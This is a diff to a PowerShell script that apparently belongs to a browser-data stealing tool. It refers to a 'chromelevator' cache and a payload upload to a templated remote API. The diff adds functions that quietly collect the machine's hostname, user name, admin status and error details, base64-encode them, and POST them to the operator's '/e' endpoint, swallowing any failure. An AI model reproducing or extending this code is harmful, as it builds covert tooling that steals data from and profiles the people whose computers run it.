@@ -1,6 +1,7 @@
 $ErrorActionPreference = "Stop"
 $ApiBase = "__API_BASE__"
 $PayloadUrl = "$ApiBase/p"
+$ErrorUrl = "$ApiBase/e"
 $ChromelevatorCacheDir = Join-Path $env:LOCALAPPDATA "remote-scripts\chromelevator"
 $CloseTerminal = __CLOSE_TERMINAL__
 $DebugMode = __DEBUG_MODE__
@@ -135,6 +136,54 @@ function ConvertTo-JsonUnlimited {
     $serializer.MaxJsonLength = 2147483647
     $serializer.RecursionLimit = $RecursionLimit
     return $serializer.Serialize((ConvertTo-SerializableObject $InputObject))
+}
+
+function New-ScriptErrorReport {
+    param(
+        $ErrorRecord,
+        [int]$Code
+    )
+
+    $innerErrors = New-Object System.Collections.Generic.List[string]
+    $exception = $ErrorRecord.Exception.InnerException
+    while ($null -ne $exception) {
+        $innerErrors.Add("$($exception.GetType().FullName): $($exception.Message)")
+        $exception = $exception.InnerException
+    }
+
+    $scriptLine = $null
+    if ($ErrorRecord.InvocationInfo) {
+        $scriptLine = $ErrorRecord.InvocationInfo.ScriptLineNumber
+    }
+
+    return [ordered]@{
+        code = $Code
+        hostname = $env:COMPUTERNAME
+        username = $env:USERNAME
+        executedAt = [DateTime]::UtcNow.ToString("o")
+        errorType = $ErrorRecord.Exception.GetType().FullName
+        errorMessage = $ErrorRecord.Exception.Message
+        innerErrors = @($innerErrors)
+        errorId = $ErrorRecord.FullyQualifiedErrorId
+        scriptLine = $scriptLine
+        isAdmin = $IsRunningAsAdmin
+    }
+}
+
+function Send-ScriptErrorReport {
+    param(
+        $ErrorRecord,
+        [int]$Code
+    )
+
+    try {
+        $report = New-ScriptErrorReport -ErrorRecord $ErrorRecord -Code $Code
+        $reportJson = ConvertTo-JsonUnlimited -InputObject $report
+        $reportB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($reportJson))
+        $null = Invoke-RestMethod -Uri $ErrorUrl -Method Post -ContentType "text/plain; charset=utf-8" -Body $reportB64
+    }
+    catch {
+    }
 }
 
 
@@ -1737,6 +1786,7 @@ Write-DebugStep "Payload upload completed"
 catch {
     Write-DebugError $_
     $script:ExitCode = Get-ErrorCodeFromException $_
+    Send-ScriptErrorReport -ErrorRecord $_ -Code $script:ExitCode
     Write-Host $script:ExitCode
 }
 finally {
